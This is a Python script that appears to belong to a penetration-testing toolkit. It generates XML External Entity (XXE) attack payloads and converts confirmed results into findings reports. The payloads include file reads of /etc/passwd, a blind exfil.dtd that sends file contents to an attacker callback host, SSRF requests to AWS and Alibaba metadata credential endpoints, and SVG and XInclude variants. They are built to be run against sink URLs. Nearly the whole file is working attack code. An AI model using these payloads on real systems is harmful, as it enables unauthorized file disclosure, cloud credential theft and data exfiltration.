#!/usr/bin/env python3
"""gen_xxe.py — generate XXE payloads + DTDs and emit rupu-ingestible outputs.

Modes (combinable):

1) Payload generation:
     python3 scripts/gen_xxe.py --file /etc/passwd --callback cbx7.oast.pro \
         --out payloads/
   Writes to payloads/: classic read, internal-entity probe, OOB probes,
   php://filter read, blind parameter-entity request + hosted exfil.dtd and
   error.dtd, SSRF (AWS/Alibaba metadata), SVG, XInclude. Also prints each
   body to stdout with --print.

2) Work units from a sink list (one URL per line, optional "URL METHOD CT"):
     python3 scripts/gen_xxe.py --sinks sinks.txt --callback cbx7.oast.pro \
         --work-units units.json
   Emits a JSON array (first char '[') for rupu for_each / dispatch; hand it
   to the work-units skill.

3) Findings/assets from a results file you maintain while testing:
     python3 scripts/gen_xxe.py --results results.json \
         --findings findings.json --assets assets.json
   results.json: list (or {"results":[...]}) of
     {"url": "...", "vector": "xml-body|svg|docx|soap|saml|json-pivot",
      "confirmed": true, "impact": "file-read|ssrf|oob-resolution|none",
      "file_read": "/etc/passwd", "ssrf_target": "http://169.254.169.254/...",
      "payload": "...", "param": "name",
      "evidence": {"request": "...", "response": "...", "oob": "...",
                   "data_sample": "..."}}
"""

import argparse
import json
import os
import re
import sys
from urllib.parse import urlsplit

XML_DECL = '<?xml version="1.0" encoding="UTF-8"?>\n'


def payloads(target_file, callback, dtd_url):
    """Return {name: content} of payload bodies and hosted DTD files."""
    f = target_file
    cb = callback
    p = {}

    p["probe_internal.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY x "xxeprobe31337">]>\n'
        + "<r>&x;</r>\n"
    )
    p["probe_oob_general.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://probe-g.%s/x">]>\n' % cb
        + "<r>&xxe;</r>\n"
    )
    p["probe_oob_parameter.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY %% p SYSTEM "http://probe-p.%s/x"> %%p;]>\n' % cb
        + "<r>x</r>\n"
    )
    p["classic_read.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://%s">]>\n' % f
        + "<r><data>&xxe;</data></r>\n"
    )
    p["php_filter_read.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY xxe SYSTEM '
          '"php://filter/convert.base64-encode/resource=%s">]>\n' % f
        + "<r><data>&xxe;</data></r>\n"
    )
    p["blind_dtd_request.xml"] = (
        XML_DECL
        + "<!DOCTYPE r [\n"
        + '  <!ENTITY %% ext SYSTEM "%s/exfil.dtd">\n' % dtd_url
        + "  %ext; %wrap; %send;\n"
        + "]>\n<r>x</r>\n"
    )
    p["exfil.dtd"] = (
        '<!ENTITY % file SYSTEM "file://{0}">\n'
        '<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '
        "'{1}/leak?d=%file;'\">\n"
    ).format(f, dtd_url)
    p["error_dtd_request.xml"] = (
        XML_DECL
        + "<!DOCTYPE r [\n"
        + '  <!ENTITY %% ext SYSTEM "%s/error.dtd">\n' % dtd_url
        + "  %ext; %wrap; %err;\n"
        + "]>\n<r>x</r>\n"
    )
    p["error.dtd"] = (
        '<!ENTITY % file SYSTEM "file://{0}">\n'
        '<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM '
        "'file:///nonexistent/%file;'\">\n"
    ).format(f)
    p["ssrf_aws.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY xxe SYSTEM '
          '"http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>\n'
        + "<r><data>&xxe;</data></r>\n"
    )
    p["ssrf_alibaba.xml"] = (
        XML_DECL
        + '<!DOCTYPE r [<!ENTITY xxe SYSTEM '
          '"http://100.100.100.200/latest/meta-data/">]>\n'
        + "<r><data>&xxe;</data></r>\n"
    )
    p["svg_read.svg"] = (
        '<?xml version="1.0" standalone="yes"?>\n'
        + '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://%s">]>\n' % f
        + '<svg xmlns="http://www.w3.org/2000/svg" width="900" height="600">\n'
        + '  <text font-size="14" x="10" y="20">&xxe;</text>\n</svg>\n'
    )
    p["xinclude.xml"] = (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
        + '  <xi:include parse="text" href="file://%s"/>\n</foo>\n' % f
    )
    return p


def slug(s):
    return re.sub(r"[^a-z0-9]+", "-", (s or "x").lower()).strip("-") or "x"


def read_sinks(path):
    sinks = []
    with open(path) as fh:
        for ln in fh:
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            parts = ln.split()
            sinks.append({
                "url": parts[0],
                "method": parts[1] if len(parts) > 1 else "POST",
                "content_type": parts[2] if len(parts) > 2 else "application/xml",
            })
    return sinks


def to_work_units(sinks, callback, out_dir):
    units = []
    for s in sinks:
        u = urlsplit(s["url"])
        sid = "%s-%s" % (slug(u.netloc), slug(u.path))
        units.append({
            "id": "xxe-" + sid,
            "title": "Test XML sink for XXE: %s %s" % (s["method"],
                                                       u.path or "/"),
            "targets": [s["url"]],
            "hints": {
                "vector": "xml-body",
                "method": s["method"],
                "content_type": s["content_type"],
                "payload_dir": out_dir or "payloads/",
                "probe_order": ("internal-entity, oob-param-entity, "
                                "classic-read, blind-dtd, error-based, ssrf"),
                "callback": callback or "",
                "oob_subdomain": ("%s.%s" % (sid[:40], callback)
                                  if callback else ""),
            },
        })
    return units


def load_results(path):
    with open(path) as fh:
        data = json.load(fh)
    if isinstance(data, dict):
        data = data.get("results", [])
    return data


def severity_for(r):
    impact = (r.get("impact") or "").lower()
    if impact == "file-read" or r.get("file_read"):
        return "critical"
    if impact == "ssrf" or r.get("ssrf_target"):
        return "high"
    return "medium"  # proven external resolution only


def to_findings(results):
    findings = []
    for r in results:
        if not r.get("confirmed"):
            continue
        u = urlsplit(r["url"])
        ev = dict(r.get("evidence") or {})
        sev = severity_for(r)
        if r.get("file_read"):
            what = "arbitrary file read (%s)" % r["file_read"]
            detail = ("resolving file://%s and returning its contents"
                      % r["file_read"])
        elif r.get("ssrf_target"):
            what = "SSRF to %s" % r["ssrf_target"]
            detail = ("fetching attacker-chosen URLs server-side (%s); "
                      "additionally CWE-918" % r["ssrf_target"])
        else:
            what = "external entity resolution (blind)"
            detail = ("resolving an attacker-controlled external entity, "
                      "proven by out-of-band interaction")
        rationale = (
            "The XML parser behind %s processes DOCTYPE declarations and "
            "resolves external entities, %s. Vector: %s. Payload: %s"
            % (r["url"], detail, r.get("vector", "xml-body"),
               (r.get("payload") or "")[:300]))
        if ev.get("data_sample"):
            rationale += ". Leaked sample: %s" % ev["data_sample"][:200]
        if ev.get("oob"):
            rationale += ". OOB evidence: %s" % str(ev["oob"])[:200]
        ev["rationale"] = rationale
        if r.get("payload") and "payload" not in ev:
            ev["payload"] = r["payload"]
        findings.append({
            "title": "XML External Entity injection in %s — %s" % (
                u.path or "/", what),
            "scope": "endpoint",
            "target_ref": r["url"],
            "severity": sev,
            "classification": {"owasp": "WSTG-INPV-07", "cwe": "CWE-611"},
            "evidence": ev,
        })
    return findings


def to_assets(results):
    assets = []
    for r in results:
        u = urlsplit(r["url"])
        base = "%s://%s" % (u.scheme or "https", u.netloc)
        coords = [{"t": "url", "v": base},
                  {"t": "http_route", "v": u.path or "/"}]
        if r.get("param"):
            coords.append({"t": "param", "v": r["param"]})
        confirmed = bool(r.get("confirmed"))
        assets.append({
            "kind": "web:route",
            "label": "%s — XXE %s" % (u.path or "/",
                                      "confirmed" if confirmed else "probed"),
            "coordinates": coords,
            "depth": "exploited" if confirmed else "tested",
        })
    return assets


def write_json(path, obj):
    with open(path, "w") as fh:
        json.dump(obj, fh, indent=2)
        fh.write("\n")
    print("[+] wrote %s (%d items)" % (path, len(obj)), file=sys.stderr)


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--file", default="/etc/passwd",
                    help="target file to read (default /etc/passwd)")
    ap.add_argument("--callback", default="",
                    help="OOB host, e.g. cbx7.oast.pro or 198.51.100.7")
    ap.add_argument("--dtd-url", default="",
                    help="base URL where DTDs will be hosted "
                         "(default http://<callback>)")
    ap.add_argument("--out", help="directory to write payload files into")
    ap.add_argument("--print", dest="do_print", action="store_true",
                    help="print payloads to stdout")
    ap.add_argument("--sinks", help="sink list file (URL [METHOD] [CT])")
    ap.add_argument("--work-units", help="work-units JSON array out")
    ap.add_argument("--results", help="results JSON in (confirmed tests)")
    ap.add_argument("--findings", help="findings.report payloads out")
    ap.add_argument("--assets", help="assets.mark payloads out")
    args = ap.parse_args()

    did = False

    if args.out or args.do_print:
        did = True
        cb = args.callback or "ATTACKER.example.net"
        dtd_url = args.dtd_url or ("http://%s" % cb)
        gen = payloads(args.file, cb, dtd_url.rstrip("/"))
        if args.out:
            os.makedirs(args.out, exist_ok=True)
            for name, body in gen.items():
                fn = os.path.join(args.out, name)
                with open(fn, "w") as fh:
                    fh.write(body)
                print("[+] wrote %s" % fn, file=sys.stderr)
            print("[i] host DTDs: cd %s && python3 -m http.server 80"
                  % args.out, file=sys.stderr)
        if args.do_print:
            for name, body in gen.items():
                print("### %s\n%s" % (name, body))

    if args.sinks:
        did = True
        if not args.work_units:
            print("[-] --sinks requires --work-units OUT", file=sys.stderr)
            sys.exit(2)
        units = to_work_units(read_sinks(args.sinks), args.callback,
                              args.out)
        write_json(args.work_units, units)

    if args.results:
        did = True
        results = load_results(args.results)
        if args.findings:
            write_json(args.findings, to_findings(results))
        if args.assets:
            write_json(args.assets, to_assets(results))
        if not args.findings and not args.assets:
            json.dump(to_findings(results), sys.stdout, indent=2)
            print()

    if not did:
        print(__doc__)
        sys.exit(2)


if __name__ == "__main__":
    main()
